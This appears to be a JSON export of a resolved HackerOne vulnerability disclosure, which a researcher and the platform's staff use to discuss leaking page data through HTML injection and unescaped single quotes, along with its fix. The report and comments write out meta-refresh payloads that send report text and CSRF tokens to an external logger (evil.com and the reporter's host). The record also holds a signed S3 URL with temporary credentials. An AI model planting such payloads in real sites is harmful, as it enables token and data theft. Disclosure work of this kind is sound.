{"id":110578,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA1Nzg=","url":"https://hackerone.com/reports/110578","title":"HTML injection can lead to data theft","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-13T23:59:29.009Z","submitted_at":"2016-01-13T23:59:29.009Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"intidc","url":"/intidc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-01-26T16:05:58.643Z","bug_reporter_agreed_on_going_public_at":"2016-01-26T16:05:58.005Z","team_member_agreed_on_going_public_at":"2016-01-26T02:26:36.122Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey,\n\nThis is more like an in-depth security thing with a reasonable attack scenario.\n\nIn some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:\n\n1. There's a HTML injection vulnerability\n2. The sensitive data is preceded by the HTML injection vulnerability\n3. After the sensitive data, there's a single quote (could be inserted by the attacker)\n\nDue to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.\n\nThe problem is that HackerOne does not convert single quotes to their HTML entities (\u0026lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\n\n## Example\n\nSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:\n\n[report title]\n\\\u003e reporter: report body\n \u003c vendor: reply\n \u003c vendor: internal reply\n\\\u003e reporter: comment (that contains a single quote)\n\nAt this point, if the reporter would add the following to the summary (above the report body):\n\n\u003e \u003cmeta http-equiv=\"refresh\" content='0; url=https://evil.com/log.php?text=\n\nThis will send the following to the server:\n\n\u003ereport body + vendor reply + internal reply\n\nBecause the unconverted ' in the last comment would close the attribute and form a valid HTML element.\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.\n\nAnother vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.\n\n## The fix\n\nThe behavior described above can easily be prevented.: \n\nI'd just add the conversion to \u0026lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.\n\n\nBest regards\n\n\nInti","vulnerability_information_html":"\u003cp\u003eHey,\u003c/p\u003e\n\n\u003cp\u003eThis is more like an in-depth security thing with a reasonable attack scenario.\u003c/p\u003e\n\n\u003cp\u003eIn some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThere\u0026#39;s a HTML injection vulnerability\u003c/li\u003e\n\u003cli\u003eThe sensitive data is preceded by the HTML injection vulnerability\u003c/li\u003e\n\u003cli\u003eAfter the sensitive data, there\u0026#39;s a single quote (could be inserted by the attacker)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eDue to these requirements I haven\u0026#39;t been able to test it, though I did found some places where it theoretically could work.\u003c/p\u003e\n\n\u003cp\u003eThe problem is that HackerOne does not convert single quotes to their HTML entities (â€˜), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\u003c/p\u003e\n\n\u003ch2 id=\"example\"\u003eExample\u003c/h2\u003e\n\n\u003cp\u003eSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here\u0026#39;s a quick sketch of a report to illustrate this:\u003c/p\u003e\n\n\u003cp\u003e[report title]\u003cbr\u003e\n\u0026gt; reporter: report body\u003cbr\u003e\n \u0026lt; vendor: reply\u003cbr\u003e\n \u0026lt; vendor: internal reply\u003cbr\u003e\n\u0026gt; reporter: comment (that contains a single quote)\u003c/p\u003e\n\n\u003cp\u003eAt this point, if the reporter would add the following to the summary (above the report body):\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026#39;0; url=\u003ca title=\"https://evil.com/log.php?text=\" href=\"/redirect?url=https%3A%2F%2Fevil.com%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://evil.com/log.php?text=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis will send the following to the server:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ereport body + vendor reply + internal reply\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBecause the unconverted \u0026#39; in the last comment would close the attribute and form a valid HTML element.\u003cbr\u003e\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.\u003c/p\u003e\n\n\u003cp\u003eAnother vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.\u003c/p\u003e\n\n\u003ch2 id=\"the-fix\"\u003eThe fix\u003c/h2\u003e\n\n\u003cp\u003eThe behavior described above can easily be prevented.: \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;d just add the conversion to \u0026amp;lsquot  to your sanitization filter. I can\u0026#39;t think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.\u003c/p\u003e\n\n\u003cp\u003eBest regards\u003c/p\u003e\n\n\u003cp\u003eInti\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-02-25T02:26:36.443Z","allow_singular_disclosure_after":-152848173.2044291,"singular_disclosure_allowed":true,"vote_count":14,"voters":["intidc","r3y","updatelap","its_afolic","satishpk1","japz","trieulieuf9","spetr0x","dyabla","frankwangjianbo","and 4 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":757285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"*lsquo, sorry.\n\nI saw some pages actually include the CSRF token in the page body. If there would be a single quote somewhere after the form, let's say in the footer, a simple HTML injection before the hidden CSRF field could grab the token.","markdown_message":"\u003cp\u003e*lsquo, sorry.\u003c/p\u003e\n\n\u003cp\u003eI saw some pages actually include the CSRF token in the page body. If there would be a single quote somewhere after the form, let\u0026#39;s say in the footer, a simple HTML injection before the hidden CSRF field could grab the token.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-14T08:04:27.398Z","updated_at":"2016-01-14T08:04:27.398Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757312,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Happen to know which pages have the CSRF token embedded in them, besides the one mentioned in #103787?","markdown_message":"\u003cp\u003eHappen to know which pages have the CSRF token embedded in them, besides the one mentioned in \u003ca href=\"/reports/103787\"\u003e#103787\u003c/a\u003e?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-14T08:41:01.379Z","updated_at":"2016-01-14T08:41:01.379Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":757320,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well most of the team and account edit settings pages seem to do. Haven't found any of these at risk right now (in contrary to the examples mentioned above). But as a regular single quote could trigger this behavior, I'd make sure to convert the single quotes at these pages as well.","markdown_message":"\u003cp\u003eWell most of the team and account edit settings pages seem to do. Haven\u0026#39;t found any of these at risk right now (in contrary to the examples mentioned above). But as a regular single quote could trigger this behavior, I\u0026#39;d make sure to convert the single quotes at these pages as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-14T08:53:51.502Z","updated_at":"2016-01-14T08:54:19.701Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":758096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For your information: I did find a page that'd leak the auth token, for example this page:\n\nhttps://hackerone.com/mobilevikings/groups/8275/edit (team group edit page)\n\nDisplays the group name before and after the token. \n\nSo if an attacker would be able to change it to \n\n\u003e \"\u003e'\u003e\u003cmeta http-equiv=\"refresh\" content='0; url=http://www.ceukelai.re/log.php?text=\n\nHe can steal the token.\n\nScreenie of simulation attached. Even though this particular example probably won't ever be an issue, it proves that there's a potential risk linked to this issue.\n\n","markdown_message":"\u003cp\u003eFor your information: I did find a page that\u0026#39;d leak the auth token, for example this page:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://hackerone.com/mobilevikings/groups/8275/edit\" href=\"https://hackerone.com/mobilevikings/groups/8275/edit\"\u003ehttps://hackerone.com/mobilevikings/groups/8275/edit\u003c/a\u003e (team group edit page)\u003c/p\u003e\n\n\u003cp\u003eDisplays the group name before and after the token. \u003c/p\u003e\n\n\u003cp\u003eSo if an attacker would be able to change it to \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u0026quot;\u0026gt;\u0026#39;\u0026gt;\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026#39;0; url=\u003ca title=\"http://www.ceukelai.re/log.php?text=\" href=\"/redirect?url=http%3A%2F%2Fwww.ceukelai.re%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.ceukelai.re/log.php?text=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eHe can steal the token.\u003c/p\u003e\n\n\u003cp\u003eScreenie of simulation attached. Even though this particular example probably won\u0026#39;t ever be an issue, it proves that there\u0026#39;s a potential risk linked to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-14T18:36:28.685Z","updated_at":"2016-01-14T18:36:38.516Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":69324,"filename":"h1HTMLCSRF.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/069/324/0fe1db7aa4d48cd5cc0e0db7fae651c00bfabd78/h1HTMLCSRF.png?response-content-disposition=attachment%3B%20filename%3D%22h1HTMLCSRF.png%22%3B%20filename%2A%3DUTF-8%27%27h1HTMLCSRF.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041609Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=47ffa6f6c37ab38e7348b45b103912c3507709142539203437923f91297a650c"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":758482,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @intidc for the additional details. We will see what we can do here.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e for the additional details. We will see what we can do here.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-14T21:53:33.019Z","updated_at":"2016-01-14T21:53:33.019Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":759306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note: use \u0026apos; (apos) instead of \u0026lsquo; (lsquo)/\u0026rsquo; (rsquo)","markdown_message":"\u003cp\u003eNote: use \u0026#39; (apos) instead of â€˜ (lsquo)/â€™ (rsquo)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-15T13:44:07.509Z","updated_at":"2016-01-15T13:45:06.157Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760157,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nIn your example, how is the attacker stealing the CSRF token using that meta refresh tag? Also, wouldn't the attacker need to be a team admin in this case?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIn your example, how is the attacker stealing the CSRF token using that meta refresh tag? Also, wouldn\u0026#39;t the attacker need to be a team admin in this case?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-15T23:34:02.757Z","updated_at":"2016-01-15T23:34:02.757Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Andrew,\n\nIf the injection is successful, the url part of the META attribute would look like this (it's highlighted in blue in the screenshot I provided earlier)\n\nhttp://www.ceukelai.re/log.php?text=\u003c/h2\u003e\u003c/div\u003e\u003cform class=\"edit_team_member_group\"... {bunch of stuff including the token}, until we reach the next single quote located in the team_member_group_name input field. \n\nSo if the victim would visit the page, he would be redirected to my logging script and the HTML data, including the form token would be passed as a GET parameter (text). Once my logger receives the HTML, it can extract the token and abuse it. If single quote were encoded as, for example \u0026apos, this wouldn't happen as there would no way for an attacker to enclose the form data in the refresh URL argument.\n\nOn the attack scenario: yes, I suppose - but that's just an example of the CSRF token leakage. At this moment an attack on the report page (see initial post) would be more likely to happen. If H1 would have an unconverted single quote somewhere in the footer, all pages would be at risk.\n\nHave a nice weekend,\n\nInti ","markdown_message":"\u003cp\u003eHey Andrew,\u003c/p\u003e\n\n\u003cp\u003eIf the injection is successful, the url part of the META attribute would look like this (it\u0026#39;s highlighted in blue in the screenshot I provided earlier)\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://www.ceukelai.re/log.php?text=\" href=\"/redirect?url=http%3A%2F%2Fwww.ceukelai.re%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.ceukelai.re/log.php?text=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;form class=\u0026quot;edit_team_member_group\u0026quot;... {bunch of stuff including the token}, until we reach the next single quote located in the team_member_group_name input field. \u003c/p\u003e\n\n\u003cp\u003eSo if the victim would visit the page, he would be redirected to my logging script and the HTML data, including the form token would be passed as a GET parameter (text). Once my logger receives the HTML, it can extract the token and abuse it. If single quote were encoded as, for example \u0026amp;apos, this wouldn\u0026#39;t happen as there would no way for an attacker to enclose the form data in the refresh URL argument.\u003c/p\u003e\n\n\u003cp\u003eOn the attack scenario: yes, I suppose - but that\u0026#39;s just an example of the CSRF token leakage. At this moment an attack on the report page (see initial post) would be more likely to happen. If H1 would have an unconverted single quote somewhere in the footer, all pages would be at risk.\u003c/p\u003e\n\n\u003cp\u003eHave a nice weekend,\u003c/p\u003e\n\n\u003cp\u003eInti \u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-15T23:48:20.042Z","updated_at":"2016-01-15T23:48:20.042Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764643,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick update here -- I'm still working on a fix. It's a little more complicated than what I'd initially thought since we use different renderers for different parts of the UI.","markdown_message":"\u003cp\u003eQuick update here -- I\u0026#39;m still working on a fix. It\u0026#39;s a little more complicated than what I\u0026#39;d initially thought since we use different renderers for different parts of the UI.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-20T02:38:45.523Z","updated_at":"2016-01-20T02:38:45.523Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764764,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Take tour time! A good fix \u003e a quick fix. Let me know if you need any help.\n\n -Inti","markdown_message":"\u003cp\u003eTake tour time! A good fix \u0026gt; a quick fix. Let me know if you need any help.\u003c/p\u003e\n\n\u003cp\u003e-Inti\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-20T05:35:19.445Z","updated_at":"2016-01-20T05:35:41.723Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764913,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"See also https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes for why it may make more sense to use `\u0026#39;` instead of `\u0026apos;`. Note that Ruby's `CGI.escapeHTML` uses `\u0026#39;` as well.","markdown_message":"\u003cp\u003eSee also \u003ca title=\"https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes\" href=\"/redirect?url=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F2083754%2Fwhy-shouldnt-apos-be-used-to-escape-single-quotes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for why it may make more sense to use \u003ccode\u003e\u0026amp;#39;\u003c/code\u003e instead of \u003ccode\u003e\u0026amp;apos;\u003c/code\u003e. Note that Ruby\u0026#39;s \u003ccode\u003eCGI.escapeHTML\u003c/code\u003e uses \u003ccode\u003e\u0026amp;#39;\u003c/code\u003e as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-20T10:07:39.416Z","updated_at":"2016-01-20T10:07:39.416Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":769615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Interesting point @reed, thanks!\n\nI think browsers should also implement a meta-refresh CSP directive. Apparently someone proposed this [back in 2011](https://lists.w3.org/Archives/Public/public-web-security/2011Jun/0157.html).","markdown_message":"\u003cp\u003eInteresting point \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e, thanks!\u003c/p\u003e\n\n\u003cp\u003eI think browsers should also implement a meta-refresh CSP directive. Apparently someone proposed this \u003ca href=\"/redirect?url=https%3A%2F%2Flists.w3.org%2FArchives%2FPublic%2Fpublic-web-security%2F2011Jun%2F0157.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eback in 2011\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-23T17:37:13.341Z","updated_at":"2016-01-23T17:37:13.341Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771613,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nThere is some underlying issue that could not be solved easily and will require some further investigation, but we've deployed an interim fix that escapes the quotes in any Markdown that is passed to the front end. Can you verify that this resolves the immediate risk?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThere is some underlying issue that could not be solved easily and will require some further investigation, but we\u0026#39;ve deployed an interim fix that escapes the quotes in any Markdown that is passed to the front end. Can you verify that this resolves the immediate risk?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-25T22:28:45.254Z","updated_at":"2016-01-25T22:28:45.254Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771632,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I can confirm this eliminates the risk of the example I provided (team group edit page), however, single quotes in user generated content (such as report bodies and titles, summaries, replies) don't seem to be escaped yet, so the risk remains.","markdown_message":"\u003cp\u003eHi, I can confirm this eliminates the risk of the example I provided (team group edit page), however, single quotes in user generated content (such as report bodies and titles, summaries, replies) don\u0026#39;t seem to be escaped yet, so the risk remains.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-25T22:44:45.590Z","updated_at":"2016-01-25T22:44:45.590Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771715,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@intidc,\n\nAll our other UGC is embedded within React components, which should be safe according to documentation:\n\u003e By default, React escapes the HTML to prevent XSS. If you really want to render HTML, you can use the dangerouslySetInnerHTML property.\n\nI've experimented with escaping in our various layers, from the JSON assembled by JBuilder to the CJSX in our React components, but none of this adds any additional value. With React auto-escaping/unescaping during the rendering process, any quote mark within our values should not accidentally match up with an unterminated quote mark from an injected HTML node.\n\nLet me know if there's anything I may have missed.","markdown_message":"\u003cp\u003e\u003ca href=\"/intidc\"\u003e@intidc\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAll our other UGC is embedded within React components, which should be safe according to documentation:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eBy default, React escapes the HTML to prevent XSS. If you really want to render HTML, you can use the dangerouslySetInnerHTML property.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI\u0026#39;ve experimented with escaping in our various layers, from the JSON assembled by JBuilder to the CJSX in our React components, but none of this adds any additional value. With React auto-escaping/unescaping during the rendering process, any quote mark within our values should not accidentally match up with an unterminated quote mark from an injected HTML node.\u003c/p\u003e\n\n\u003cp\u003eLet me know if there\u0026#39;s anything I may have 